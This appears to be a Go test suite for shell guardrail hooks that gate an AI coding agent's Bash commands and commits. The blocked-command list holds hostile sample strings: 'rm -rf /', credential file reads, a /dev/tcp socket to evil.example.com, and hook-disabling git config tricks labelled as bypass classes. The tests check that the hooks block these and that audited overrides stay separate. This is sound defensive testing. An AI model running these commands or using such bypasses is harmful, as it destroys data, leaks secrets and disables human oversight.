package guard

import (
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

// preToolUseJSON builds the exact envelope Claude Code pipes to a PreToolUse
// hook on STDIN — {"tool_name":"Bash","tool_input":{"command":CMD}}. The guards
// run with NO argv in production, so a test that passes the command as an arg
// exercises a path the engine never takes; piping this JSON is the real path
// (and the one under which the ` gh `/` claude ` token rules were INERT until
// read_tool_command landed). json.Marshal escapes CMD correctly.
func preToolUseJSON(t *testing.T, cmd string) string {
	t.Helper()
	out, err := json.Marshal(map[string]any{
		"tool_name":  "Bash",
		"tool_input": map[string]any{"command": cmd},
	})
	if err != nil {
		t.Fatal(err)
	}
	return string(out)
}

// These tests exercise the actual guardrail SHELL scripts (mechanism, ADR-0005),
// proving Phase 1 exit criterion "guardrails block a destructive test" — and the
// audited override path — without needing docker. They run in the normal gate.

func absHook(t *testing.T, name string) string {
	t.Helper()
	p, err := filepath.Abs(filepath.Join("..", "..", "config", "hooks", name))
	if err != nil {
		t.Fatal(err)
	}
	return p
}

func runHook(dir string, env []string, args ...string) error {
	c := exec.Command("sh", args...)
	c.Dir = dir
	// Hermetic: the audited ALLOW_* overrides must come ONLY from the test's
	// explicit env, never leak in from the ambient shell. Otherwise running the
	// suite under `ALLOW_SPEC_CHANGE=1 git commit ...` would make a "should BLOCK"
	// assertion silently pass — the spec guard's own test defeated by the override
	// it polices (LL-006). GIT_* redirection vars are stripped for the same
	// reason in the other direction: hooks shell out to git, and a leaked
	// GIT_DIR/GIT_WORK_TREE makes that git operate on the REAL repo instead of
	// the fixture (LL-010 incident).
	c.Env = append(hermeticEnv(), env...)
	return c.Run()
}

// hermeticEnv returns the ambient environment with audited ALLOW_* overrides
// and all GIT_* vars stripped, then pins git's config scope to nothing
// (GIT_CONFIG_GLOBAL/SYSTEM=/dev/null). Every fixture process — git itself or
// a hook that shells out to git — must build its env from this, so a test can
// only ever act on the repo it explicitly targets (LL-006, LL-010).
func hermeticEnv() []string {
	var out []string
	for _, kv := range os.Environ() {
		if strings.HasPrefix(kv, "ALLOW_") || strings.HasPrefix(kv, "GIT_") {
			continue
		}
		out = append(out, kv)
	}
	return append(out, "GIT_CONFIG_GLOBAL=/dev/null", "GIT_CONFIG_SYSTEM=/dev/null")
}

// gitIn runs one git command pinned to dir — explicit -C (not cwd inheritance)
// AND the hermetic env, so neither a leaked GIT_DIR nor ambient config can
// redirect it (LL-010: belt and braces, each sufficient alone).
func gitIn(t *testing.T, dir string, args ...string) {
	t.Helper()
	c := exec.Command("git", append([]string{"-C", dir}, args...)...)
	c.Env = hermeticEnv()
	if out, err := c.CombinedOutput(); err != nil {
		t.Fatalf("git -C %s %v: %v: %s", dir, args, err, out)
	}
}

func newGitRepo(t *testing.T, branch string) string {
	t.Helper()
	dir := t.TempDir()
	gitIn(t, dir, "init", "-b", branch)
	gitIn(t, dir, "config", "user.email", "t@example.com")
	gitIn(t, dir, "config", "user.name", "t")
	// An initial commit so HEAD is born and rev-parse reports the branch (as it
	// would in any real repo a pre-commit hook runs in).
	gitIn(t, dir, "commit", "--allow-empty", "-m", "init")
	return dir
}

func TestGuardBashBlocksDangerousAllowsBenign(t *testing.T) {
	hook := absHook(t, "guard-bash")
	// Assembled at runtime so neither the test source nor the harness deny-list
	// is the thing under test — the script is.
	danger := strings.Join([]string{"rm", "-rf", "/"}, " ")
	if runHook("", nil, hook, danger) == nil {
		t.Error("guard-bash should BLOCK a destructive command")
	}
	if err := runHook("", nil, hook, "git status"); err != nil {
		t.Errorf("guard-bash should allow a benign command: %v", err)
	}
}

func TestBranchGuardBlocksMainAllowsOverrideAndBranch(t *testing.T) {
	hook := absHook(t, "branch-guard")

	main := newGitRepo(t, "main")
	if runHook(main, nil, hook) == nil {
		t.Error("branch-guard should BLOCK on main")
	}
	if err := runHook(main, []string{"ALLOW_MAIN_COMMIT=1"}, hook); err != nil {
		t.Errorf("ALLOW_MAIN_COMMIT=1 should permit (audited): %v", err)
	}

	feat := newGitRepo(t, "feat/x")
	if err := runHook(feat, nil, hook); err != nil {
		t.Errorf("branch-guard should allow a feature branch: %v", err)
	}
}

// TestGateHermeticToGitEnv is the LL-010 regression test. Incident
// (2026-06-10): a commit ran with GIT_DIR/GIT_WORK_TREE set (host-worktree
// attempt); the pre-commit gate inherited them, and this package's fixtures —
// which shell out to git — resolved through the leaked gitdir and wrote
// core.worktree and a test identity into the REAL shared .git/config,
// bricking every git client on every machine. This test poisons the process
// env with a GIT_DIR pointing at a scratch "victim" repo, runs the same
// fixture flows, and asserts the victim's config file is byte-identical
// afterward — proving the suite is hermetic to GIT_* independently of the
// Makefile-level scrub.
func TestGateHermeticToGitEnv(t *testing.T) {
	// The victim: a real repo whose config must never change.
	victim := t.TempDir()
	gitIn(t, victim, "init", "-b", "main")
	victimCfg := filepath.Join(victim, ".git", "config")
	before, err := os.ReadFile(victimCfg)
	if err != nil {
		t.Fatalf("read victim config: %v", err)
	}

	// Poison the process env exactly as the incident did. t.Setenv makes these
	// visible to os.Environ(), i.e. to every fixture helper below.
	t.Setenv("GIT_DIR", filepath.Join(victim, ".git"))
	t.Setenv("GIT_WORK_TREE", victim)

	// Run the representative fixture flows: repo creation (init/config/commit),
	// a hook that shells out to git, and a staged-change path.
	repo := newGitRepo(t, "feat/poisoned")
	if err := runHook(repo, nil, absHook(t, "branch-guard")); err != nil {
		t.Errorf("branch-guard should allow a feature branch under poisoned env: %v", err)
	}
	if err := os.WriteFile(filepath.Join(repo, "f.txt"), []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}
	gitIn(t, repo, "add", "f.txt")

	// Positive control: the fixture wrote its identity where intended.
	repoCfg, err := os.ReadFile(filepath.Join(repo, ".git", "config"))
	if err != nil || !strings.Contains(string(repoCfg), "t@example.com") {
		t.Fatalf("fixture repo config missing test identity (err=%v) — fixture broke, hermeticity unproven", err)
	}

	// The assertion that would have caught the incident: victim untouched.
	after, err := os.ReadFile(victimCfg)
	if err != nil {
		t.Fatalf("re-read victim config: %v", err)
	}
	if string(before) != string(after) {
		t.Errorf("poisoned GIT_DIR leaked into fixtures — victim .git/config changed:\n--- before ---\n%s\n--- after ---\n%s", before, after)
	}
}

func TestProtectPathsBlocksFrozenContract(t *testing.T) {
	hook := absHook(t, "protect-paths")

	// FR-GUARD-PROTECT-PATHS: the test is the hook's FULL pattern set, so exercise
	// BOTH frozen-contract patterns — specs and ADRs — not just one.
	for _, frozen := range []string{"docs/SPEC-x.md", "docs/decisions/0099-x.md"} {
		t.Run(frozen, func(t *testing.T) {
			repo := newGitRepo(t, "feat/x")
			if err := os.MkdirAll(filepath.Join(repo, filepath.Dir(frozen)), 0o755); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(filepath.Join(repo, frozen), []byte("x"), 0o644); err != nil {
				t.Fatal(err)
			}
			gitIn(t, repo, "add", frozen)
			if runHook(repo, nil, hook) == nil {
				t.Errorf("protect-paths should BLOCK a staged change to %s", frozen)
			}
			if err := runHook(repo, []string{"ALLOW_SPEC_CHANGE=1"}, hook); err != nil {
				t.Errorf("ALLOW_SPEC_CHANGE=1 should permit %s (audited): %v", frozen, err)
			}
		})
	}
}

// TestProtectPathsBlocksTrustConfig (FR-GUARD-TRUST-CONFIG, envelope 040 /
// 029.B): staged changes to the harness's trust config — settings files and
// hook scripts — are blocked absent the audited ALLOW_TRUST_CHANGE=1
// override. The test is the hook's FULL trust pattern set, and proves the
// two override classes do NOT cross-unlock: a spec authorization is not a
// guardrail authorization (and vice versa).
func TestProtectPathsBlocksTrustConfig(t *testing.T) {
	hook := absHook(t, "protect-paths")

	for _, path := range []string{
		".claude/settings.json",
		".claude/settings.local.json",
		".claude/hooks/guard-bash.sh",
	} {
		t.Run(path, func(t *testing.T) {
			repo := newGitRepo(t, "feat/x")
			if err := os.MkdirAll(filepath.Join(repo, filepath.Dir(path)), 0o755); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(filepath.Join(repo, path), []byte("x"), 0o644); err != nil {
				t.Fatal(err)
			}
			gitIn(t, repo, "add", path)
			if runHook(repo, nil, hook) == nil {
				t.Errorf("protect-paths should BLOCK a staged change to %s", path)
			}
			if runHook(repo, []string{"ALLOW_SPEC_CHANGE=1"}, hook) == nil {
				t.Errorf("ALLOW_SPEC_CHANGE must NOT unlock trust config %s — separate authorizations", path)
			}
			if err := runHook(repo, []string{"ALLOW_TRUST_CHANGE=1"}, hook); err != nil {
				t.Errorf("ALLOW_TRUST_CHANGE=1 should permit %s (audited): %v", path, err)
			}
		})
	}

	// And the inverse: a trust authorization must not unlock a frozen contract.
	t.Run("no-cross-unlock-of-specs", func(t *testing.T) {
		repo := newGitRepo(t, "feat/x")
		if err := os.MkdirAll(filepath.Join(repo, "docs"), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(repo, "docs/SPEC-x.md"), []byte("x"), 0o644); err != nil {
			t.Fatal(err)
		}
		gitIn(t, repo, "add", "docs/SPEC-x.md")
		if runHook(repo, []string{"ALLOW_TRUST_CHANGE=1"}, hook) == nil {
			t.Error("ALLOW_TRUST_CHANGE must NOT unlock frozen contracts — separate authorizations")
		}
	})

	// Skills are deliberately OUTSIDE the trust class: instructions the
	// permission stack mediates, not the stack itself.
	t.Run("skills-not-blocked", func(t *testing.T) {
		repo := newGitRepo(t, "feat/x")
		if err := os.MkdirAll(filepath.Join(repo, ".claude/skills/replan"), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(repo, ".claude/skills/replan/SKILL.md"), []byte("x"), 0o644); err != nil {
			t.Fatal(err)
		}
		gitIn(t, repo, "add", ".claude/skills/replan/SKILL.md")
		if err := runHook(repo, nil, hook); err != nil {
			t.Errorf("a skill edit must pass without overrides: %v", err)
		}
	})
}

// TestGuardBashBlocksBypassClasses (phase-1 review H3/H4): each named bypass
// class — spacing tricks, alternate privilege tools, hook-path redirects
// (case-folded: git config keys are case-insensitive), credential reach,
// raw-socket and interpreter one-liner egress — must be BLOCKED, while the
// everyday benign shapes that sit closest to each pattern stay allowed.
func TestGuardBashBlocksBypassClasses(t *testing.T) {
	hook := absHook(t, "guard-bash")

	blocked := []string{
		"git  push   --force origin main",               // spacing bypass (H4)
		"git\tpush\t--force",                            // tab separator (H4)
		"doas rm x",                                     // alternate privilege tool (H4)
		"git -c core.hooksPath=/dev/null commit -m x",   // hook redirect (H4)
		"git config core.HOOKSPATH /tmp/empty",          // case-folded key (H4)
		"cat /root/.claude/.credentials.json",           // cred reach past the Read deny (H3)
		"sh -c 'exec 3<>/dev/tcp/evil.example.com/443'", // raw-socket egress (H3)
		"python3 -c 'import urllib.request'",            // interpreter one-liner egress (H3)
		"perl -e 'use IO::Socket;'",                     // interpreter one-liner egress (H3)
	}
	for _, c := range blocked {
		if runHook("", nil, hook, c) == nil {
			t.Errorf("guard-bash should BLOCK: %q", c)
		}
	}

	benign := []string{
		"git push origin feat/x",
		"git commit -m \"force of habit\"",
		"grep -e pattern file.txt", // -e here is grep's, not perl's
		"python3 script.py",
		"node server.js",
		"rm -rf ./build",
	}
	for _, c := range benign {
		if err := runHook("", nil, hook, c); err != nil {
			t.Errorf("guard-bash should allow: %q (%v)", c, err)
		}
	}
}
